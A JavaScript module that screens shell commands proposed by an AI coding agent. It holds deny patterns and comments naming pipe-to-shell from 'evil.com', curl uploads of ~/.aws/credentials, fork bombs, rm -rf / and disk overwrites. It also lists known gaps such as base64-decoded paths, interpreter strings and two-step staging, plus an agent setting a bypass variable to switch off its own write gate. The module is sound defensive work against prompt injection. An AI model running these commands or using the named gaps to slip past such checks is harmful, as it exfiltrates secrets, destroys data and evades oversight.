// SPDX-License-Identifier: AGPL-3.0-only
// bash-safety.js — L4 Wall 5: Bash dangerous-command refusal + audience
// trip-wire.
//
// The capability-scope gate (permission.js) tells us WHICH steps may
// invoke Bash. It does not tell us WHICH commands are safe. Without this
// module, a prompt-injected partner could fire `curl evil.com | bash`
// from the code/verify step because verify legitimately needs Bash.
//
// Two layers:
//
//   1. Pattern refusal — a small allowlist of canonical destructive shapes
//      (rm -rf on root-adjacent paths, pipe-to-shell from network,
//      privilege-escalation writes). NOT exhaustive — sandbox v2 (Docker
//      + seccomp) is the real fix. This is the cheap, deterministic
//      pre-filter that catches the prompt-injection script kiddies.
//
//   2. Audience trip-wire — once any tool in the agentic loop returned
//      audience='external' (subsystem sticky flag), Bash is REFUSED for
//      the rest of the turn regardless of command content. Rationale:
//      external content is the #1 prompt-injection vector. If the model
//      has read untrusted text AND then proposes a shell command, we
//      assume the worst. The model can pivot to read-only inspection
//      (Grep, Read, Glob) or escalate to the operator via
//      operator_request{kind:'approval'}.
//
// API:
//   isCommandSafe(command, ctx) → { allowed, reason?, pattern?, severity? }
//
// Return shape:
//   { allowed: true }                                          — green-light
//   { allowed: false, reason, pattern, severity: 'block' }     — pattern hit
//   { allowed: false, reason: 'external_content_taint',
//     severity: 'block' }                                      — trip-wire

// Canonical destructive shapes. Each entry: { name, pattern, why }.
// Patterns are evaluated against the literal command string (untrimmed).
// Keep this list TIGHT — every entry should map to a real attacker
// playbook, not a paranoid wildcard. Operator escapes via the explicit
// operator_request{kind:'approval'} path if a legit workflow needs one.
const DANGEROUS_PATTERNS = Object.freeze([
  {
    name: 'rm_rf_root_adjacent',
    pattern: /\brm\s+(?:-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\s+(?:\/\s*(?:$|[^a-zA-Z0-9_.])|\/[*]|~\s*$|~\/\s*$|\.\.\/\.\.|--no-preserve-root)/,
    why: 'rm -rf on / or ~ or with --no-preserve-root will destroy operator data'
  },
  {
    name: 'pipe_to_shell_from_network',
    // curl/wget URL | sh|bash — the canonical drive-by RCE shape.
    pattern: /\b(?:curl|wget|fetch)\b[^|]*\|\s*(?:sh|bash|zsh|ksh|fish|dash|sh\s+-[a-z]*)\b/,
    why: 'piping network content directly to a shell is the canonical drive-by RCE'
  },
  {
    name: 'eval_from_network',
    pattern: /\beval\s+["'`]?\$\((?:curl|wget|fetch)\b/,
    why: 'eval $(curl ...) executes attacker-controlled bytes in the operator shell'
  },
  {
    name: 'shutdown_or_reboot',
    pattern: /\b(?:shutdown|reboot|halt|poweroff)\b(?!\s+--help)/,
    why: 'shutdown/reboot is operator-deliberate; the autonomous partner has no business issuing it'
  },
  {
    name: 'fork_bomb',
    pattern: /:\(\)\s*\{\s*:\|:&\s*\}\s*;\s*:/,
    why: 'shell fork bomb'
  },
  {
    name: 'dd_to_block_device',
    pattern: /\bdd\b[^\n]*\bof\s*=\s*\/dev\/(?:sd[a-z]|nvme|disk|hd[a-z])/,
    why: 'dd of=/dev/sdX overwrites raw disks'
  },
  {
    name: 'chmod_world_writable_root',
    pattern: /\bchmod\s+(?:-[a-zA-Z]+\s+)?(?:777|a\+w)\s+\//,
    why: 'chmod 777 / opens the entire filesystem to any user/process'
  },
  {
    name: 'chown_root',
    pattern: /\bchown\s+(?:-[a-zA-Z]+\s+)?(?:root:|:root)\s+/,
    why: 'chown root:* on operator files is privilege manipulation'
  },
  {
    name: 'rewrite_etc',
    // `>` is not a word boundary, so `\b>` never matches. Anchor on
    // whitespace or start-of-string instead.
    pattern: /(?:^|\s)(?:>\s*\/etc\/|tee\s+\/etc\/|cp\s+\S+\s+\/etc\/|mv\s+\S+\s+\/etc\/)/,
    why: 'writing to /etc/ mutates operator system config'
  },
  {
    name: 'rewrite_ssh_config',
    pattern: /(?:^|\s)(?:>\s*~\/\.ssh\/|tee\s+~?\/?\.ssh\/|>\s*\$HOME\/\.ssh\/)/,
    why: 'writing under ~/.ssh/ is credential manipulation'
  },
  {
    name: 'sudo_passwordless',
    pattern: /\bsudo\b(?:\s+-[a-zA-Z]+)*\s+(?:rm|chmod|chown|dd|sh|bash|\/[a-zA-Z])/,
    why: 'sudo invocation escalates beyond the partner\'s normal scope'
  },
  {
    name: 'rewrite_mcp_clients',
    // The external-MCP registry is the ONLY authorization gate on which
    // downstream servers mcp_call can reach; a partner-written entry is
    // self-authorization. Block shell writes the same
    // way the Write/Edit tools are blocked by path-policy.
    pattern: /(?:>>?|\btee\b|\bcp\b|\bmv\b|\bsed\b[^|;&\n]*-i)[^|;&\n]*(?:~\/\.troth\/mcp-clients\.json|\$HOME\/\.troth\/mcp-clients\.json)/,
    why: 'shell write to the external-MCP registry = self-authorization'
  },
  {
    name: 'exfiltrate_credentials',
    // Accept any non-alphanumeric byte (space, quote, @, =) before the
    // credential-path prefix. `curl -d @~/.aws/credentials` is the
    // canonical attacker shape — the `@` precedes the path because it
    // tells curl to read from file.
    pattern: /\b(?:curl|wget|fetch|nc|netcat)\b[^|;&\n]*(?:~\/\.ssh\/|\$HOME\/\.ssh\/|~\/\.aws\/|\$HOME\/\.aws\/|~\/\.troth\/credentials\.json|\$HOME\/\.troth\/credentials\.json)/,
    why: 'network read of credential files = exfiltration attempt'
  },
  {
    name: 'stvc_bypass_env',
    // TROTH_STVC_BYPASS=1 turns the substrate's own write gate off
    // (state.js honours it on every recordAction). It exists as the
    // OPERATOR's debugging escape hatch in their own shell, and doctor
    // reports it when set. A partner command that sets it — inline
    // (`TROTH_STVC_BYPASS=1 node …`), via export, or through env(1) — is
    // self-authorization: the judged lowering the wall that judges it.
    // The spawn side strips the inherited variable; this refuses the
    // spelled-out form. Not ack-able, like every self-authorization shape.
    pattern: /\bTROTH_STVC_BYPASS\s*=/,
    why: 'setting the STVC bypass from the partner shell is self-authorization; the operator escape hatch lives in the operator\'s own shell'
  }
]);

// Strict-taint switch (default OFF). See path-policy.js for the full rationale.
function _strictTaint() {
  return /^(1|true|on|yes)$/i.test(String(process.env.TROTH_TAINT_STRICT || ''));
}

// ---------------------------------------------------------------------------
// Layer 3 — resolved-destination check.
//
// The patterns above match the command as TEXT, so they are only as good as
// the spelling an attacker chooses. `curl -d @~/.aws/credentials` is caught;
// the same path spelled out from the filesystem root is the same act, written
// the way a program would naturally emit it, and sailed straight through.
// Same for `> ~/.ssh/authorized_keys` versus its expanded form. Adding a
// regex per spelling is a race that text always wins.
//
// So stop matching paths and resolve them. path-policy expands ~, normalizes
// .., follows symlinks, folds case where the filesystem does, and holds the
// one list of destinations nothing may touch. The $HOME and ${HOME} forms are
// expanded here before handing a path over, since those are shell spellings a
// write-destination policy has no reason to know about.
//
// This is a net, not a proof, and the holes are worth naming rather than
// leaving to look closed.
//
//   - A path built at runtime from a variable, assembled in a subshell, or
//     decoded from base64 is not there to read at scan time.
//   - An interpreter carries its own filesystem calls in a string argument:
//     `node -e`, `python3 -c`, `perl -e` are not shell syntax and are not
//     parsed here.
//   - Two steps beat one scan. Staging a protected file somewhere ordinary
//     and sending it in a LATER command is two individually permitted acts;
//     so is linking to it and reading through the link. Nothing that judges
//     one command at a time can see the pair.
//
// What stands behind all three is the sandbox, where a protected file is not
// merely refused but absent. This layer is what covers operator ground, which
// is deliberately outside the sandbox because the operator asked for their
// own machine there.
const _fsPath = require('path');
const _pathPolicy = require('./path-policy.js');

// Shell-ish tokenizer: splits on unquoted whitespace and drops the quotes it
// consumed, so `> "$HOME/.ssh/x"` yields the same token as the bare form.
function _tokenize(command) {
  const out = [];
  let cur = '';
  let quote = null;
  let held = false;   // distinguishes a real empty token ('') from no token
  for (let i = 0; i < command.length; i++) {
    const c = command[i];
    if (quote) {
      if (c === quote) quote = null;
      else { cur += c; held = true; }
      continue;
    }
    if (c === '"' || c === "'") { quote = c; held = true; continue; }
    if (/\s/.test(c)) { if (held) { out.push(cur); cur = ''; held = false; } continue; }
    // Redirects bind to the next token; emit them so the scanner can see
    // which token is a write target. `>file` with no space still splits.
    if (c === '>' || c === '<') {
      if (held) { out.push(cur); cur = ''; held = false; }
      let op = c;
      if (command[i + 1] === '>') { op += '>'; i++; }
      out.push(op);
      continue;
    }
    if (c === '|' || c === ';' || c === '&') {
      if (held) { out.push(cur); cur = ''; held = false; }
      out.push(c);
      continue;
    }
    cur += c; held = true;
  }
  if (held) out.push(cur);
  return out;
}

// Does this token name a filesystem path we can resolve? Anything with a
// variable left in it (other than the $HOME forms we expand) is unresolvable,
// and guessing is worse than admitting the miss.
function _asPath(token) {
  let t = String(token || '');
  // curl's `@file`, and `--data-binary=@file` / `-d@file` forms.
  t = t.replace(/^-{0,2}[a-zA-Z-]*=?@/, '').replace(/^@/, '');
  // `of=/path` (dd), and env-assignment prefixes. Stripping the key leaves
  // the path, which is the part with a policy answer.
  t = t.replace(/^[A-Za-z_][A-Za-z0-9_]*=/, '');
  if (!t) return null;
  // ${HOME} is the same variable as $HOME to bash; supporting one spelling
  // and not the other was a gap, not a decision.
  t = t.replace(/^\$\{HOME\}(?=\/|$)/, process.env.HOME || '')
       .replace(/^\$HOME(?=\/|$)/,       process.env.HOME || '');
  if (/\$/.test(t)) return null;              // unresolved variable
  if (/^~(?:\/|$)/.test(t) || _fsPath.isAbsolute(t)) return t;
  return null;                                 // relative: not our business
}

// A leading backslash disables alias lookup and is otherwise a no-op, so
// `\cp` runs cp. Matching on the raw token let one character hide every
// write verb. Strip the escape before deciding what a token names.
function _verb(token) {
  return _fsPath.basename(String(token || '').replace(/^\\+/, ''));
}

// Verbs whose operands are ALL destinations, versus those where only the
// final operand is written and the earlier ones are read. Treating a copy's
// source as a destination refused `cp ~/.ssh/config /tmp/backup`, which is
// the operator reading their own file, and a wall that refuses that is one
// people learn to route around.
const _WRITE_ALL_OPERANDS  = /^(?:tee|truncate|touch)$/;
const _WRITE_LAST_OPERAND  = /^(?:cp|mv|install|ln)$/;
// sqlite3 opens its database read-WRITE by default, so the first path operand
// is a destination even when the SQL that follows only reads. This verb
// belonged to no class at all, which is why a DELETE against the substrate was
// a command the scanner had no opinion about — and blocklisting the database
// alone would not have helped, because no path was ever extracted from it.
const _WRITE_FIRST_OPERAND = /^(?:sqlite3|sqlite)$/;
const _NETWORK_VERBS = /^(?:curl|wget|fetch|nc|netcat|scp|sftp|ssh|rsync|ftp)$/;

// ssh and its family READ a key to authenticate with it. That is the opposite
// of sending it: `ssh -i ~/.ssh/id_rsa host` is how most people invoke ssh at
// all, and refusing it — with no acknowledge path, since exfiltration is not
// ack-able — broke an everyday command in the name of protecting the file it
// was using correctly.
//
// So the flag's VALUE is exempt, and only the value. A key named as a bare
// operand is still an upload: `scp ~/.ssh/id_rsa host:/tmp/` stays refused,
// and so does `scp -i ~/.ssh/id_rsa ~/.ssh/id_rsa host:/` — the first is the
// identity, the second is the payload.
const _SSH_FAMILY = /^(?:ssh|scp|sftp|rsync|ssh-add|ssh-keyscan)$/;
// -o takes Key=Value; these are the ones whose value is a path read for auth.
const _SSH_OPT_PATH = /^(?:IdentityFile|CertificateFile|UserKnownHostsFile|GlobalKnownHostsFile|IdentityAgent)=/i;

// How many tokens after index i are the value of an identity-style flag?
// Returns 0 when this token is not one. Handles the separated form (-i KEY),
// the fused form (-iKEY), and -o Opt=path in both spellings.
function _sshIdentitySkip(tokens, i) {
  const t = String(tokens[i] || '');
  if (t === '-i' || t === '-F' || t === '-E') return 1;          // value is the next token
  if (/^-[iFE].+/.test(t)) return 0;                             // fused: the flag IS the token
  if (t === '-o') {
    return _SSH_OPT_PATH.test(String(tokens[i + 1] || '')) ? 1 : 0;
  }
  return 0;
}
function _isSshIdentityToken(tok) {
  const t = String(tok || '');
  return /^-[iFE].+/.test(t) || /^-o/.test(t) && _SSH_OPT_PATH.test(t.replace(/^-o/, ''));
}

// Split into segments that do NOT share data. `;`, `&&`, `||` and `&` start
// an independent command, so a network call in one does not make a file read
// in the next an exfiltration. A pipe is the opposite: it exists to hand one
// command's output to the next, so taint crosses it.
function _segments(tokens) {
  const segs = [];
  let cur = [];
  let piped = false;
  for (const tok of tokens) {
    if (tok === ';' || tok === '&') {
      if (cur.length) segs.push({ tokens: cur, piped });
      cur = []; piped = false;
      continue;
    }
    if (tok === '|') { cur.push(tok); piped = true; continue; }
    cur.push(tok);
  }
  if (cur.length) segs.push({ tokens: cur, piped });
  return segs;
}

// Every path the command points at, tagged with why we care. A path that is
// merely READ is harmless on its own; it matters when the same segment can
// also send it somewhere.
function _reachedPaths(command) {
  const found = [];
  for (const seg of _segments(_tokenize(command))) {
    const tokens = seg.tokens;
    let networked = false;
    let sshFamily = false;
    let sedInPlace = false;
    for (let i = 0; i < tokens.length; i++) {
      const v = _verb(tokens[i]);
      if (_NETWORK_VERBS.test(v)) networked = true;
      if (_SSH_FAMILY.test(v)) sshFamily = true;
      if (v === 'sed' && tokens.slice(i + 1).some((t) => /^-[a-zA-Z]*i/.test(t))) sedInPlace = true;
    }
    // Which token indexes are the value of an identity-style flag. Computed
    // per segment so an ssh invocation does not exempt paths in a curl that
    // shares the line.
    const identityValue = new Set();
    if (sshFamily) {
      for (let i = 0; i < tokens.length; i++) {
        const skip = _sshIdentitySkip(tokens, i);
        for (let k = 1; k <= skip; k++) identityValue.add(i + k);
        if (_isSshIdentityToken(tokens[i])) identityValue.add(i);
      }
    }
    for (let i = 0; i < tokens.length; i++) {
      const tok = tokens[i];
      // `>`, `>>` and `>|` all write the next token. The force-clobber form
      // emits its `|` separately, so step over it rather than reading it as
      // the target and skipping the real one.
      if (tok === '>' || tok === '>>') {
        let k = i + 1;
        while (tokens[k] === '|') k++;
        const p = _asPath(tokens[k]);
        if (p) found.push({ path: p, how: 'write' });
        i = k;
        continue;
      }
      const v = _verb(tok);
      if (v === 'dd') {
        // dd names its destination `of=` and its source `if=`. Only the
        // former is a write; the latter is a read like any other.
        for (let j = i + 1; j < tokens.length; j++) {
          if (/^[|;&]$/.test(tokens[j])) break;
          const raw = String(tokens[j]);
          if (/^of=/.test(raw)) { const p = _asPath(raw); if (p) found.push({ path: p, how: 'write' }); }
          else if (networked)   { const p = _asPath(raw); if (p) found.push({ path: p, how: 'exfil' }); }
        }
        continue;
      }
      if (_WRITE_ALL_OPERANDS.test(v) || (v === 'sed' && sedInPlace)) {
        for (let j = i + 1; j < tokens.length; j++) {
          if (/^[|;&]$/.test(tokens[j])) break;
          const p = _asPath(tokens[j]);
          if (p) found.push({ path: p, how: 'write' });
        }
        continue;
      }
      if (_WRITE_LAST_OPERAND.test(v)) {
        // The destination is the last OPERAND, which is not the same as the
        // last operand that happens to resolve. `ln -s /etc/hosts ./hosts`
        // writes the relative link name and only reads /etc/hosts; picking
        // the last resolvable path instead made the source look like the
        // target and refused a plain symlink into the working directory.
        const operands = [];
        for (let j = i + 1; j < tokens.length; j++) {
          if (/^[|;&]$/.test(tokens[j])) break;
          if (/^-/.test(String(tokens[j]))) continue;   // flags are not operands
          operands.push(tokens[j]);
        }
        const destTok = operands.pop();
        const dest = destTok === undefined ? null : _asPath(destTok);
        if (dest) found.push({ path: dest, how: 'write' });
        // The rest are read, and reading matters only where the segment can
        // also send what it read somewhere.
        if (networked) {
          for (const srcTok of operands) {
            const src = _asPath(srcTok);
            if (src) found.push({ path: src, how: 'exfil' });
          }
        }
        continue;
      }
      if (_WRITE_FIRST_OPERAND.test(v)) {
        for (let j = i + 1; j < tokens.length; j++) {
          if (/^[|;&]$/.test(tokens[j])) break;
          if (/^-/.test(String(tokens[j]))) continue;   // flags are not operands
          const p = _asPath(tokens[j]);
          if (p) { found.push({ path: p, how: 'write' }); break; }
        }
        continue;
      }
      if (networked && !identityValue.has(i)) {
        const p = _asPath(tok);
        if (p) found.push({ path: p, how: 'exfil' });
        continue;
      }
      // Anything else naming a resolvable path is being READ. Nothing emitted
      // a read tag before this, so `cat` and `cut` and `strings` handed a
      // credential file to a scanner that had no tag for it and therefore no
      // verdict: the command was not permitted, it was never judged.
      if (!identityValue.has(i)) {
        const p = _asPath(tok);
        if (p) found.push({ path: p, how: 'read' });
      }
    }
  }
  return found;
}

function _checkReachedPaths(command) {
  let reached;
  try { reached = _reachedPaths(command); }
  catch (_) { return null; }            // a scanner bug must not block work
  for (const hit of reached) {
    let verdict;
    try {
      if (hit.how === 'read') {
        verdict = _pathPolicy.isReadablePath(hit.path, {});
      } else if (hit.how === 'exfil') {
        // Sending a file off the machine is refused when the file is protected
        // in EITHER direction. Asking only the write policy meant a project's
        // .env — which nothing guards as a destination, because its owner
        // rewrites it daily — was the one shape that sailed through the check
        // written to catch exactly it.
        verdict = _pathPolicy.isWritablePath(hit.path, {});
        if (!verdict || verdict.allowed !== false) {
          verdict = _pathPolicy.isReadablePath(hit.path, {});
        }
      } else {
        verdict = _pathPolicy.isWritablePath(hit.path, {});
      }
    } catch (_) { continue; }
    if (!verdict || verdict.allowed !== false) continue;
    if (verdict.reason !== 'blocked_system_path' &&
        verdict.reason !== 'blocked_secret_read') continue;
    return {
      allowed:  false,
      reason:   hit.how === 'exfil' ? 'credential_exfiltration'
              : hit.how === 'read'  ? 'blocked_secret_read'
              :                       'blocked_destination',
      pattern:  verdict.pattern,
      severity: 'block',
      detail:   hit.how === 'exfil'
        ? 'this command can send ' + hit.path + ' off the machine: ' + verdict.detail
        : hit.how === 'read'
          ? 'reading ' + hit.path + ' is refused: ' + verdict.detail
          : verdict.detail
    };
  }
  return null;
}

// ---------------------------------------------------------------------------
// Layer 0 — credential literals in the command itself.
//
// Every layer above judges where a command POINTS. None of them looks at what
// it CARRIES, and a secret that has already reached the model's context does
// not need a file to leave through: it can be typed straight into the command
// line. That is also the shape that survives longest, because raw stdout is
// archived and full-text indexed, so a key echoed once is a key on disk and in
// the search index from then on.
//
// The detail below names the pattern and never the match. A refusal that
// quotes the command back would write the credential into exactly the log the
// rule exists to keep it out of.
const CREDENTIAL_LITERALS = Object.freeze([
  { name: 'anthropic_key',     pattern: /\bsk-ant-[A-Za-z0-9_-]{16,}/ },
  { name: 'openai_key',        pattern: /\bsk-(?:proj-)?[A-Za-z0-9]{32,}/ },
  { name: 'google_key',        pattern: /\bAIza[0-9A-Za-z_-]{35}\b/ },
  { name: 'github_token',      pattern: /\bgh[pousr]_[A-Za-z0-9]{30,}/ },
  { name: 'aws_key_id',        pattern: /\bAKIA[0-9A-Z]{16}\b/ },
  { name: 'slack_token',       pattern: /\bxox[baprs]-[A-Za-z0-9-]{12,}/ },
  { name: 'private_key_block', pattern: /-----BEGIN (?:[A-Z ]+ )?PRIVATE KEY-----/ },
  { name: 'json_web_token',    pattern: /\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}/ }
]);

function _checkCredentialLiterals(command) {
  for (const c of CREDENTIAL_LITERALS) {
    if (c.pattern.test(command)) {
      return {
        allowed:  false,
        reason:   'credential_in_command',
        pattern:  c.name,
        severity: 'block',
        detail:   'this command carries what looks like a live credential in its text. '
                + 'The partner shell is not where keys belong: its output is archived raw '
                + 'and indexed, so one run leaves the value on disk and searchable. '
                + 'Read it from the environment or the vault at run time instead.'
      };
    }
  }
  return null;
}

// ---------------------------------------------------------------------------
// Layer 4 — egress.
//
// Nothing here asked where a command was SENDING anything. The fetcher has had
// a default-deny allowlist since it was written, on the reasoning that
// untrusted web content is the primary injection vector — but that governs what
// enters through the fetcher, and a shell reaches the network on its own. So
// the partner could not read a page through the tool that checks and could
// post one through the tool that did not.
//
// The rule is deliberately narrow, because an egress wall that refuses
// `curl https://registry.npmjs.org/...` is one nobody keeps, and the seed
// allowlist is a ten-domain RESEARCH list that was never meant to name a
// package registry. So fetching is not gated here at all: a GET is content
// coming IN, which is the fetcher's question rather than this one. What is
// gated is data going OUT — an upload, a form, a POST body — to a host the
// operator has not named, and the refusal names the command that names it.
const _HTTP_VERBS             = /^(?:curl|wget|fetch)$/;
const _UPLOAD_FLAG_VALUED     = /^(?:-T|--upload-file|-d|--data|--data-raw|--data-binary|--data-urlencode|-F|--form|--post-data|--post-file)$/;
const _UPLOAD_FLAG_FUSED      = /^(?:-[dTF][^-\s]|--(?:data|data-raw|data-binary|data-urlencode|form|upload-file|post-data|post-file)=)/;
const _METHOD_FLAG            = /^(?:-X|--request|--method)$/;
const _WRITING_METHOD         = /^(?:POST|PUT|PATCH|DELETE)$/i;

let _allowlistMod;
function _allowlist() {
  if (_allowlistMod === undefined) {
    try { _allowlistMod = require('./web-allowlist.js'); }
    catch (_) { _allowlistMod = null; }
  }
  return _allowlistMod;
}

// isAllowedFn is a test seam. Reading the real allowlist materializes it from
// the seed on first call, which is right in production and wrong in a test
// run: the verdict would then depend on whichever domains this operator has
// added. Tests pass their own list; nothing else does.
function _checkEgress(command, isAllowedFn) {
  let segs;
  try { segs = _segments(_tokenize(command)); }
  catch (_) { return null; }            // a scanner bug must not block work
  for (const seg of segs) {
    const tokens = seg.tokens;
    if (!tokens.some((t) => _HTTP_VERBS.test(_verb(t)))) continue;

    let sendsData = false;
    for (let i = 0; i < tokens.length && !sendsData; i++) {
      const t = String(tokens[i]);
      if (_UPLOAD_FLAG_VALUED.test(t) || _UPLOAD_FLAG_FUSED.test(t)) sendsData = true;
      else if (_METHOD_FLAG.test(t) && _WRITING_METHOD.test(String(tokens[i + 1] || ''))) sendsData = true;
    }
    if (!sendsData) continue;

    for (const tok of tokens) {
      const raw = String(tok);
      if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(raw)) continue;
      let ok = false;
      // Fail closed: an allowlist that cannot be read is not an allowlist that
      // says yes. Uploads are rare enough that erring here costs a message,
      // not a workflow.
      try {
        ok = isAllowedFn
          ? !!isAllowedFn(raw)
          : !!(_allowlist() && _allowlist().isAllowed(raw));
      } catch (_) { ok = false; }
      if (ok) continue;
      let host = raw;
      try { host = new URL(raw).host || raw; } catch (_) { /* keep the raw form */ }
      return {
        allowed:  false,
        reason:   'egress_not_allowlisted',
        pattern:  'outbound_payload',
        severity: 'block',
        detail:   'this command carries data out to ' + host + ', which the operator has not '
                + 'allowlisted (https only). Fetching is not gated — sending is. Add the host '
                + 'deliberately with `troth config web allowlist add ' + host + '`.'
      };
    }
  }
  return null;
}

function isCommandSafe(command, ctx) {
  if (typeof command !== 'string' || !command.length) {
    return { allowed: false, reason: 'empty_command', severity: 'block' };
  }

  // Layer 0 — a credential in the command text, wherever it is headed. First,
  // because every other layer would let it through on its way to deciding
  // something else.
  const carried = _checkCredentialLiterals(command);
  if (carried) return carried;

  // Layer 2 — external-content trip-wire (CaMeL taint). OFF BY DEFAULT.
  // Blocking ALL Bash after any web_fetch breaks "research → build" (npm
  // install / node / git can't run). The real exfil/destruction shapes
  // (exfiltrate_credentials, curl|sh, rm -rf /, fork bomb) are caught by
  // Layer 1 below regardless of taint. Opt in with TROTH_TAINT_STRICT=1.
  if (ctx && ctx._l4_external_seen === true && _strictTaint()) {
    return {
      allowed:  false,
      reason:   'external_content_taint',
      severity: 'block',
      detail:   'Bash refused (TROTH_TAINT_STRICT) while external (web-fetched) content is in the agentic loop.'
    };
  }

  // Layer 1 — pattern check. First match wins (deterministic).
  for (const p of DANGEROUS_PATTERNS) {
    if (p.pattern.test(command)) {
      return {
        allowed:  false,
        reason:   'dangerous_pattern',
        pattern:  p.name,
        severity: 'block',
        detail:   p.why
      };
    }
  }

  // Layer 3 — resolved destinations. Runs after the text patterns so their
  // named verdicts keep precedence on the shapes they already own, and
  // catches the same acts written in a spelling no pattern anticipated.
  const reached = _checkReachedPaths(command);
  if (reached) return reached;

  // Layer 4 — egress. Last, so the named verdicts above keep precedence: a
  // command that uploads a credential is exfiltration, which is a sharper
  // thing to be told than that a host is unlisted.
  const outbound = _checkEgress(command);
  if (outbound) return outbound;

  return { allowed: true };
}

module.exports = {
  isCommandSafe,
  DANGEROUS_PATTERNS,
  CREDENTIAL_LITERALS,
  // exposed for tests
  _reachedPaths,
  _checkEgress,
  _tokenize
};
